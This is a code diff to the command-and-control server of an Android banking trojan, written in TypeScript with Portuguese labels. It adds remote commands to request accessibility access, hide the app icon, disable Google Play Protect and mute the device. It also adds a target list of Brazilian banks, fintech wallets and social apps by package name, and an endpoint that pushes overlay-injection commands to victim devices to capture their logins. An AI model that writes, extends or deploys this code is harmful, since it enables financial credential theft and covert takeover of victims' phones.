@@ -75,13 +75,75 @@ router.get("/events", async (req: Request, res: Response) => {
 
 router.get("/commands", async (_req: Request, res: Response) => {
   res.json([
-    { id: "launch_app", label: "Launch App", description: "Launch the default application", icon: "play" },
-    { id: "lock", label: "Lock", description: "Lock the device screen", icon: "lock" },
-    { id: "update_status", label: "Update Status", description: "Request device status update", icon: "refresh-cw" },
-    { id: "screenshot", label: "Screenshot", description: "Request a screenshot from the device", icon: "camera" },
-    { id: "reboot", label: "Reboot", description: "Reboot the device remotely", icon: "power" },
-    { id: "factory_reset", label: "Factory Reset", description: "Factory reset the device", icon: "trash-2" },
+    { id: "request_accessibility", label: "Solicitar Acessibilidade", description: "Solicitar permissão de acessibilidade", icon: "shield", category: "remote" },
+    { id: "hide_icon", label: "Ocultar Ícone", description: "Ocultar ícone do lançador do app", icon: "eye-off", category: "remote" },
+    { id: "disable_play_protect", label: "Desativar Play Protect", description: "Desativar Google Play Protect", icon: "shield-off", category: "remote" },
+    { id: "mute_device", label: "Silenciar Dispositivo", description: "Silenciar todos os sons do dispositivo", icon: "volume-x", category: "remote" },
+    { id: "restart_app", label: "Reiniciar App", description: "Forçar reinicialização do agente", icon: "refresh-cw", category: "remote" },
+    { id: "launch_app", label: "Launch App", description: "Iniciar aplicação padrão", icon: "play", category: "system" },
+    { id: "lock", label: "Lock", description: "Bloquear tela do dispositivo", icon: "lock", category: "system" },
+    { id: "update_status", label: "Update Status", description: "Solicitar atualização de status", icon: "activity", category: "system" },
+    { id: "screenshot", label: "Screenshot", description: "Capturar tela do dispositivo", icon: "camera", category: "system" },
+    { id: "reboot", label: "Reboot", description: "Reiniciar dispositivo remotamente", icon: "power", category: "danger" },
+    { id: "factory_reset", label: "Factory Reset", description: "Restaurar configurações de fábrica", icon: "trash-2", category: "danger" },
   ]);
+});
+
+const TARGET_INJECTIONS = [
+  { id: "bb", label: "Banco do Brasil", package: "br.com.bb.android", category: "bank" },
+  { id: "caixa", label: "Caixa Econômica", package: "br.gov.caixa.internet.app", category: "bank" },
+  { id: "bradesco", label: "Bradesco", package: "com.bradesco", category: "bank" },
+  { id: "itau", label: "Itaú", package: "com.itau", category: "bank" },
+  { id: "nubank", label: "Nubank", package: "com.nubank", category: "bank" },
+  { id: "inter", label: "Banco Inter", package: "br.com.intermedium", category: "bank" },
+  { id: "santander", label: "Santander", package: "com.santander.app", category: "bank" },
+  { id: "sicredi", label: "Sicredi", package: "mobi.sicredi", category: "bank" },
+  { id: "picpay", label: "PicPay", package: "com.picpay", category: "fintech" },
+  { id: "mercadopago", label: "Mercado Pago", package: "com.mercadopago.wallet", category: "fintech" },
+  { id: "pagbank", label: "PagBank", package: "br.com.uol.ps.myaccount", category: "fintech" },
+  { id: "whatsapp", label: "WhatsApp", package: "com.whatsapp", category: "social" },
+  { id: "instagram", label: "Instagram", package: "com.instagram.android", category: "social" },
+  { id: "facebook", label: "Facebook", package: "com.facebook.katana", category: "social" },
+  { id: "telegram", label: "Telegram", package: "org.telegram.messenger", category: "social" },
+];
+
+router.get("/injections", async (_req: Request, res: Response) => {
+  res.json(TARGET_INJECTIONS);
+});
+
+router.post("/injections", async (req: Request, res: Response) => {
+  const { deviceId, targetId } = req.body;
+  if (!deviceId || !targetId) {
+    res.status(400).json({ error: "deviceId and targetId required" });
+    return;
+  }
+  const target = TARGET_INJECTIONS.find(t => t.id === targetId);
+  if (!target) {
+    res.status(404).json({ error: "Target not found" });
+    return;
+  }
+  const device = await db.query.devicesTable.findFirst({ where: eq(devicesTable.id, deviceId) });
+  if (!device) {
+    res.status(404).json({ success: false, message: "Device not found" });
+    return;
+  }
+  const io: SocketIoServer = req.app.get("io");
+  if (device.socketId) {
+    io.to(device.socketId).emit("command:received", { command: `inject:overlay:${target.package}` });
+  }
+  await db.insert(eventsTable).values({
+    deviceId,
+    type: "injection",
+    message: `Overlay injection enviado: ${target.label} (${target.package})`,
+  });
+  io.emit("event:new", {
+    deviceId,
+    deviceName: device.name,
+    type: "injection",
+    message: `Overlay injection enviado para ${device.name}: ${target.label}`,
+    createdAt: new Date().toISOString(),
+  });
+  res.json({ success: true, message: `Injection '${target.label}' enviada para ${device.name}` });
 });
 
 router.post("/commands", async (req: Request, res: Response) => {
